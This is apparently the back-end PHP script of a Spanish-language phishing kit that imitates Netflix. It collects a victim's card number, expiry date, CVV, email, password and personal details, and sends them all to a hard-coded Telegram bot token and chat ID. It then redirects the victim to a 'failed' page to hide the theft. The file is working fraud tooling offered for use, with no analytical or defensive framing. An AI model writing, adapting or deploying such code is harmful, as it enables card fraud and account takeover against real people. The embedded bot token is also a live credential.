<?php 

$cc = $_POST['numero'];
$fecha = $_POST['fecha'];
$cvv = $_POST['cvv'];



session_start();
$nombre = $_SESSION['nombre'];
$apellido = $_SESSION['apellido'];

$fecha_nacimiento = $_SESSION['fecha_nacimiento'];
$telefono = $_SESSION['telefono'];
$ciudad = $_SESSION['ciudad'] ;
$codigo_postal = $_SESSION['codigo_postal']; 

$usuario = $_SESSION['email'];
$contraseña = $_SESSION['contraseña'];

$res = preg_replace('/[\/\.\;\-" "]+/', ' ', $fecha_nacimiento);
$res2 = preg_replace('/[\/\.\;\-" "]+/', ' ', $fecha);
$res3  = preg_replace('/[\@\.\;\-" "]+/', ' ', $usuario);
 
 

    $string = "🆕 NETFLIX DATOS\n ♏ Correo: $res3\n Contraseña: $contraseña\n DATOS CC\n 💵 Número Tarjeta: $cc\n 📟 Fecha exp: $res2 \n 📟 CVV: $cvv\n OTROS DATOS\n
    Nombre: $nombre\n
    Apellido: $apellido\n
    Fecha Nacimiento: $res\n
    Telefono: $telefono\n
    ciudad: $ciudad\n
    Codigo postal: $codigo_postal";
    ini_set('display_errors', 1);

    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    date_default_timezone_set('America/Guatemala');
    $token = "6422205045:AAG4OrnwHWuAyqvxbvj2MwWftamRCJkxB4I";

    $datos = [
        'chat_id' => '443703942',
        'text' => $string,
        'parse_mode' => 'MarkdownV2' #formato del mensaje
    ];
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $r_array = json_decode(curl_exec($ch), true);
    
    curl_close($ch);

   header('location:/failed.php');

?>